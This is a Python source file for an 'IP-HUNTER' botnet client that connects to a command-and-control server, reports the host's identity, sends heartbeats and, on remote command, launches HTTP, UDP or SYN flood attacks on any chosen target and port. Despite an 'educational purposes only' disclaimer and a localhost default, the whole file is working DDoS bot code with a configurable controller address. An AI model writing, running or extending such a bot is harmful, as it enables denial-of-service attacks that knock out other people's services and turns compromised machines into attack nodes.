#!/usr/bin/env python3
"""
Simple Bot for IP-HUNTER C2 Server
Educational purposes only - DO NOT use for malicious activities
"""

import socket
import subprocess
import platform
import time
import threading
import sys
import os

# Add parent dir to path to import from src
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from src.attacks import http_flood, udp_flood, syn_flood
from src.utils import add_system_log

class FullBot:
    def __init__(self, c2_host='127.0.0.1', c2_port=6667):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.bot_id = f"{socket.gethostname()}_{int(time.time())}"
        self.connected = False
        self.attacking = False
        self.running = True

    def log(self, message):
        """Add message to global dashboard logs"""
        add_system_log(f"[bold green]BOT:[/] {message}")

    def connect_to_c2(self):
        """Connect to C2 server"""
        try:
            self.log(f"Attempting connection to {self.c2_host}:{self.c2_port}...")
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.settimeout(5.0)
            self.client.connect((self.c2_host, self.c2_port))
            self.connected = True
            self.log(f"✅ Connected to C2 at {self.c2_host}:{self.c2_port}")
            # Identify itself
            self.send_message(f"IDENT: {self.bot_id} ({platform.system()})")
            return True
        except Exception as e:
            self.connected = False
            self.log(f"❌ Connection failed: {str(e)}")
            return False

    def send_message(self, message):
        """Send message to C2 server"""
        try:
            if not self.connected: return
            self.client.send(f"{message}\n".encode())
        except:
            self.connected = False
            self.log("🔌 Disconnected from C2 during send")

    def receive_message(self):
        """Receive message from C2 server"""
        try:
            if not self.connected: return None
            self.client.settimeout(2.0)
            data = self.client.recv(1024)
            if not data:
                self.connected = False
                self.log("🔌 C2 closed connection")
                return None
            return data.decode().strip()
        except socket.timeout:
            return "PONG" # Heartbeat check
        except:
            self.connected = False
            self.log("🔌 Connection lost")
            return None

    def execute_command(self, command_line):
        """Execute commands from C2"""
        parts = command_line.split()
        if not parts: return None
        
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd == 'info':
            return f"RESULT: OS: {platform.system()} {platform.release()}, Bot ID: {self.bot_id}"
        elif cmd == 'ping':
            return f"RESULT: Bot {self.bot_id} is alive"
        elif cmd == 'attack' and len(args) >= 4:
            # Format: attack <target> <port> <duration> <method>
            target = args[0]
            port = int(args[1])
            duration = int(args[2])
            method = args[3].lower()
            
            threading.Thread(target=self.run_attack, args=(target, port, duration, method), daemon=True).start()
            return f"RESULT: Started {method} attack on {target}:{port} for {duration}s"
        else:
            return f"RESULT: Unknown or invalid command: {command_line}"

    def run_attack(self, target, port, duration, method):
        """Run requested attack"""
        self.attacking = True
        self.log(f"🔥 Starting {method} attack on {target}:{port}")
        try:
            if method == 'http':
                url = target if target.startswith('http') else f"http://{target}"
                http_flood(url, duration)
            elif method == 'udp':
                udp_flood(target, port, duration)
            elif method == 'syn':
                syn_flood(target, port, duration)
        except Exception as e:
            self.log(f"❌ Attack error: {e}")
        self.attacking = False
        self.log(f"✅ Attack on {target} finished")

    def heartbeat(self):
        """Send periodic heartbeat"""
        while self.connected and self.running:
            try:
                self.send_message("PING")
                time.sleep(15)
            except:
                break

    def run(self, interactive=True):
        """Main bot loop"""
        while self.running:
            if not self.connected:
                if not self.connect_to_c2():
                    time.sleep(2) # Retry every 2s
                    continue

            # Heartbeat
            threading.Thread(target=self.heartbeat, daemon=True).start()

            try:
                while self.connected and self.running:
                    msg = self.receive_message()
                    if not msg or msg == "PONG": continue
                    
                    self.log(f"📨 From C2: {msg[:20]}...")
                    result = self.execute_command(msg)
                    if result:
                        self.send_message(result)
            except Exception as e:
                self.connected = False
            
            if self.running:
                time.sleep(1)

        if hasattr(self, 'client'): 
            try: self.client.close()
            except: pass
        self.log("🛑 Bot stopped")

def start_bot_auto(host='127.0.0.1', port=6667):
    """Start bot without user input - for Menu ID 18"""
    bot = FullBot(host, port)
    bot.run(interactive=False)

def main():
    """Manual main function"""
    print("🤖 IP-HUNTER Full Bot Client")
    print("=" * 40)
    host = input("C2 Host [127.0.0.1]: ").strip() or "127.0.0.1"
    port = input("C2 Port [6667]: ").strip() or "6667"
    try:
        port = int(port)
    except:
        port = 6667
    
    bot = FullBot(host, port)
    bot.run()

if __name__ == "__main__":
    main()

if __name__ == "__main__":
    main()